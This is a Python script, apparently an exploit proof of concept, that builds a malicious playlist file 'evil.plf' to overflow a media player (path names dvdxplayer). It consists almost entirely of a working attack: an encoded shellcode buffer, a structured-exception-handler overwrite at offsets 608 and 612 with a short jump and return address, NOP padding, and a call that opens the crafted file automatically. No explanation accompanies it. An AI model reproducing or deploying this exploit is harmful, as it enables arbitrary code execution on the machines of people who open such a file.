#!/usr/bin/python -w

import struct
import os
import time
import pyautogui
from pyautogui import press, typewrite, hotkey
buf =  ""
buf += "\xda\xd4\xbb\xa8\xf2\xac\x3a\xd9\x74\x24\xf4\x5f\x29"
buf += "\xc9\xb1\x53\x31\x5f\x17\x03\x5f\x17\x83\x6f\xf6\x4e"
buf += "\xcf\x93\x1f\x0c\x30\x6b\xe0\x71\xb8\x8e\xd1\xb1\xde"
buf += "\xdb\x42\x02\x94\x89\x6e\xe9\xf8\x39\xe4\x9f\xd4\x4e"
buf += "\x4d\x15\x03\x61\x4e\x06\x77\xe0\xcc\x55\xa4\xc2\xed"
buf += "\x95\xb9\x03\x29\xcb\x30\x51\xe2\x87\xe7\x45\x87\xd2"
buf += "\x3b\xee\xdb\xf3\x3b\x13\xab\xf2\x6a\x82\xa7\xac\xac"
buf += "\x25\x6b\xc5\xe4\x3d\x68\xe0\xbf\xb6\x5a\x9e\x41\x1e"
buf += "\x93\x5f\xed\x5f\x1b\x92\xef\x98\x9c\x4d\x9a\xd0\xde"
buf += "\xf0\x9d\x27\x9c\x2e\x2b\xb3\x06\xa4\x8b\x1f\xb6\x69"
buf += "\x4d\xd4\xb4\xc6\x19\xb2\xd8\xd9\xce\xc9\xe5\x52\xf1"
buf += "\x1d\x6c\x20\xd6\xb9\x34\xf2\x77\x98\x90\x55\x87\xfa"
buf += "\x7a\x09\x2d\x71\x96\x5e\x5c\xd8\xff\x93\x6d\xe2\xff"
buf += "\xbb\xe6\x91\xcd\x64\x5d\x3d\x7e\xec\x7b\xba\x81\xc7"
buf += "\x3c\x54\x7c\xe8\x3c\x7d\xbb\xbc\x6c\x15\x6a\xbd\xe6"
buf += "\xe5\x93\x68\x92\xed\x32\xc3\x81\x10\x84\xb3\x05\xba"
buf += "\x6d\xde\x89\xe5\x8e\xe1\x43\x8e\x27\x1c\x6c\xa1\xeb"
buf += "\xa9\x8a\xab\x03\xfc\x05\x43\xe6\xdb\x9d\xf4\x19\x0e"
buf += "\xb6\x92\x52\x58\x01\x9d\x62\x4e\x25\x09\xe9\x9d\xf1"
buf += "\x28\xee\x8b\x51\x3d\x79\x41\x30\x0c\x1b\x56\x19\xe6"
buf += "\xb8\xc5\xc6\xf6\xb7\xf5\x50\xa1\x90\xc8\xa8\x27\x0d"
buf += "\x72\x03\x55\xcc\xe2\x6c\xdd\x0b\xd7\x73\xdc\xde\x63"
buf += "\x50\xce\x26\x6b\xdc\xba\xf6\x3a\x8a\x14\xb1\x94\x7c"
buf += "\xce\x6b\x4a\xd7\x86\xea\xa0\xe8\xd0\xf2\xec\x9e\x3c"
buf += "\x42\x59\xe7\x43\x6b\x0d\xef\x3c\x91\xad\x10\x97\x11"
buf += "\x87\x2a\xf5\x3b\xb0\x12\x6c\x7e\xdd\xa4\x5b\xbd\xd8"
buf += "\x26\x69\x3e\x1f\x36\x18\x3b\x5b\xf0\xf1\x31\xf4\x95"
buf += "\xf5\xe6\xf5\xbf"
  
filename="evil.plf"
 
total_buffer = 2000
nseh_offset = 608
seh_offset = 612

junk1 = "\x90" * nseh_offset
nseh = "\x90\x90\xEB\x10"
#seh = "\x43" * 4
seh = struct.pack("<L", 0x6164172e)
junk2 = ("\x90" * 30) + buf + "\x90" * (total_buffer - nseh_offset - len(nseh) - len(seh) - len(buf) - 30)

payload = junk1 + nseh + seh + junk2

textfile = open(filename , 'w')
textfile.write(payload)
textfile.close()
time.sleep(1)
os.startfile('Z:\\quickzip\\dvdxplayer\\evil.plf')
# time.sleep(2)
# pyautogui.hotkey('alt', 'tab')
# pyautogui.hotkey('alt', 'tab')
# time.sleep(5)
# press('L')